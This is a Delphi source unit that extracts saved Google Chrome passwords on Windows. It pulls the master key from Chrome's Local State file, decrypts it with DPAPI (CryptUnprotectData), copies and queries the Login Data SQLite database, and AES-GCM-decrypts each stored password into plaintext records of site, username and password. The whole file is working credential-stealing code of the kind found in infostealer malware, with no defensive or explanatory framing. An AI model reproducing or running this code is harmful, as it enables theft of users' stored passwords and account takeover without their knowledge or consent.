unit uChromiumPassword;

interface

uses
    Winapi.Windows,
    System.NetEncoding,
    System.SysUtils,
    SynSQLite3Static,
    SynSQLite3,
    SynCommons,
    SynCrypto;

type
    TChromiumPassword = record
        origin_url: String;
        action_url: String;
        username: String;
        password: String;
        signon_realm: String;
        date_created: String;
        date_last_used: String;
        date_password_modified: String;
    end;

    TChromiumPasswordList = TArray<TChromiumPassword>;

function GetChromePasswords: TChromiumPasswordList;

implementation

const
    strGooglePath = 'Google\Chrome\User Data';
    strLocalState = 'Local State';
    strLoginData = 'Login Data';
    strLocalLoginData = 'login_data.sql';
    strEncryptedKey = 'encrypted_key';
    _fmOpenRead = 0;

function GetEnvVar(const name: String): String;
var
    pValue: Pointer;
    nLength: DWORD;
begin
    Result := '';

    GetMem(pValue, MAX_PATH);

    try
        nLength := Winapi.Windows.GetEnvironmentVariable(PWideChar(name),
          pValue, MAX_PATH);

        if nLength = 0 then
            Exit;

        SetString(Result, PWideChar(pValue), nLength);
    finally
        FreeMem(pValue);
    end;
end;

function readBytesFromFile(sFileName: String; out pBuffer: Pointer;
  out nSize: Cardinal): Boolean;
var
    F: File;
begin
    Result := False;
    pBuffer := nil;
    nSize := 0;

    AssignFile(F, sFileName);

    FileMode := _fmOpenRead;

    Reset(F, 1);

    nSize := System.FileSize(F);

    if (nSize = 0) then
    begin
        Exit;
    end;

    GetMem(pBuffer, nSize);

    BlockRead(F, pBuffer^, nSize);

    CloseFile(F);

    Result := True;
end;

function GetLocalStateText(strPath: String): String;
var
    strFileName: String;
    pText: Pointer;
    nLength: Cardinal;
begin
    Result := '';

    strFileName := GetEnvVar('LOCALAPPDATA') + '\' + strPath + '\' +
      strLocalState;

    readBytesFromFile(strFileName, pText, nLength);

    SetString(Result, PAnsiChar(pText), nLength);
end;

function GetEncryptedKey(strPath: String): String;
var
    strLocalStateText: String;
    nPos, lPos: Integer;
begin
    Result := '';

    strLocalStateText := GetLocalStateText(strPath);
    nPos := Pos(strEncryptedKey, strLocalStateText);

    if nPos = 0 then
        Exit;

    nPos := Pos(':', strLocalStateText, nPos + 1);

    if nPos = 0 then
        Exit;

    nPos := Pos('"', strLocalStateText, nPos + 1);

    if nPos = 0 then
        Exit;

    lPos := Pos('"', strLocalStateText, nPos + 1);

    if lPos = 0 then
        Exit;

    nPos := nPos + 1;

    Result := Copy(strLocalStateText, nPos, lPos - nPos);
end;

function IsDPAPIEncrypted(bytesEncryptedKey: TBytes): Boolean;
var
    int64DPAPI: Int64;
begin
    Result := False;

    if Length(bytesEncryptedKey) < 5 then
        Exit;

    int64DPAPI := PInt64(@bytesEncryptedKey[0])^;
    int64DPAPI := int64DPAPI and $000000FFFFFFFFFF;

    // DPAPI == 0x0000004950415044
    // 49 50 41 50 44
    // I  P  A  P  D

    Result := int64DPAPI = $0000004950415044;
end;

function IsPasswordV10(password_value: RawByteString): Boolean;
var
    intV10: Cardinal;
begin
    Result := False;

    if Length(password_value) <= 3 then
        Exit;

    intV10 := PCardinal(@password_value[1])^;
    intV10 := intV10 and $00FFFFFF;

    // v10 == 00303176
    // 30 31 76
    // 0  1  v

    Result := intV10 = $00303176;
end;

function DecryptPassword(Key: THash256; password_value: RawByteString): String;
var
    nonce, password_encrypted, password_decrypted: TBytes;
    i: Integer;
    IV: THash128;
    nLen: Integer;
    pad: Byte;
    AES: TAESGCM;
begin
    Result := '';

    if not IsPasswordV10(password_value) then
        Exit;

    SetLength(password_encrypted, Length(password_value) - 3);

    for i := 0 to Length(password_value) - 3 do
        password_encrypted[i] := Byte(password_value[i + 4]);

    nonce := Copy(password_encrypted, 0, 12);
    password_encrypted := Copy(password_encrypted, 12,
      Length(password_encrypted) - 12 - 16);

    nLen := Length(password_encrypted);
    pad := Byte(16 - (nLen mod 16));

    SetLength(password_encrypted, nLen + pad);

    for i := nLen to Length(password_encrypted) - 1 do
        password_encrypted[i] := pad;

    ZeroMemory(@IV[0], sizeof(THash128));

    for i := 0 to 11 do
        IV[i] := Byte(nonce[i]);

    SetLength(password_decrypted, Length(password_encrypted));

    AES := TAESGCM.Create(Key);

    AES.IV := IV;
    AES.Decrypt(@password_encrypted[0], @password_decrypted[0],
      Length(password_encrypted));

    FreeAndNil(AES);

    SetString(Result, PAnsiChar(@password_decrypted[0]), nLen);
end;

function DecodeLocalStateEncryptedKey(strPath: String): TBytes;
begin
    Result := TNetEncoding.Base64.DecodeStringToBytes(GetEncryptedKey(strPath));
end;

type
    TCryptUnprotectData = function(pDataIn: PDATA_BLOB; ppszDataDescr: PLPWSTR;
      pOptionalEntropy: PDATA_BLOB; pvReserved: Pointer; pPromptStruct: Pointer;
      dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall;

function _CryptUnprotectData(InBytes: TBytes): TBytes;
var
    DataIn, DataOut: DATA_BLOB;
    fCryptUnprotectData: TCryptUnprotectData;
    i: Integer;
begin
    SetLength(Result, 0);

    fCryptUnprotectData := TCryptUnprotectData
      (GetProcAddress(LoadLibrary('Crypt32.dll'), 'CryptUnprotectData'));

    if @fCryptUnprotectData = nil then
        Exit;

    DataIn.cbData := Length(InBytes);
    DataIn.pbData := @InBytes[0];

    ZeroMemory(@DataOut, sizeof(DataOut));

    if fCryptUnprotectData(@DataIn, nil, nil, nil, nil, 0, @DataOut)
      = BOOL(False) then
        Exit;

    if DataOut.cbData = 0 then
        Exit;

    if DataOut.pbData = nil then
        Exit;

    SetLength(Result, DataOut.cbData);

    for i := 0 to DataOut.cbData - 1 do
        Result[i] := PByte(NativeUInt(DataOut.pbData) + NativeUInt(i))^;

    LocalFree(DataOut.pbData);
end;

function GetDecryptedKey(strPath: String): TBytes;
var
    bytesEncryptedKey: TBytes;
begin
    SetLength(Result, 0);

    bytesEncryptedKey := DecodeLocalStateEncryptedKey(strPath);

    if not IsDPAPIEncrypted(bytesEncryptedKey) then
        Exit;

    bytesEncryptedKey := Copy(bytesEncryptedKey, 5,
      Length(bytesEncryptedKey) - 5);

    Result := _CryptUnprotectData(bytesEncryptedKey);
end;

function GetChromiumPassword(strPath: String; strUserProfile: String)
  : TChromiumPasswordList;
var
    SQLite3Static: TSQLite3LibraryStatic;
    SQLRequest: TSQLRequest;
    SQLite3DB: TSQLite3DB;

    origin_url, action_url, username_value, signon_realm, date_created,
      date_last_used, date_password_modified: string;
    password_value: RawByteString;
    password: String;

    bytesDecryptedKey: TBytes;

    Key: THash256;

    i: Integer;
    keyLength: Integer;

    ChromiumPassword: TChromiumPassword;

    strFileName: String;
begin
    SetLength(Result, 0);

    strFileName := GetEnvVar('LOCALAPPDATA') + '\' + strPath + '\' +
      strUserProfile + '\' + strLoginData;

    CopyFile(strFileName, strLocalLoginData, False);

    SQLite3Static := TSQLite3LibraryStatic.Create;

    SQLite3Static.initialize();
    SQLite3Static.open(strLocalLoginData, SQLite3DB);

    SQLRequest.Prepare(SQLite3DB,
      'SELECT origin_url, action_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified FROM logins');

    bytesDecryptedKey := GetDecryptedKey(strPath);
    keyLength := Length(bytesDecryptedKey);

    if keyLength <> 32 then
        Exit;

    for i := 0 to keyLength - 1 do
        Key[i] := bytesDecryptedKey[i];

    while SQLRequest.Step() = SQLITE_ROW do
    begin
        origin_url := SQLRequest.FieldS(0);
        action_url := SQLRequest.FieldS(1);
        username_value := SQLRequest.FieldS(2);
        password_value := SQLRequest.FieldBlob(3);
        signon_realm := SQLRequest.FieldS(4);
        date_created := SQLRequest.FieldS(5);
        date_last_used := SQLRequest.FieldS(6);
        date_password_modified := SQLRequest.FieldS(7);

        try
            password := DecryptPassword(Key, password_value);
        except
            password := '';
        end;

        ChromiumPassword.origin_url := origin_url;
        ChromiumPassword.action_url := action_url;
        ChromiumPassword.username := username_value;
        ChromiumPassword.password := password;
        ChromiumPassword.signon_realm := signon_realm;
        ChromiumPassword.date_last_used := date_last_used;
        ChromiumPassword.date_password_modified := date_password_modified;

        SetLength(Result, Length(Result) + 1);

        Result[Length(Result) - 1] := ChromiumPassword;
    end;

    SQLRequest.Close();
    SQLite3Static.Close(SQLite3DB);

    SQLite3Static.shutdown();
end;

function GetChromePasswords: TChromiumPasswordList;
begin
    Result := GetChromiumPassword(strGooglePath, 'Default');
end;

end.
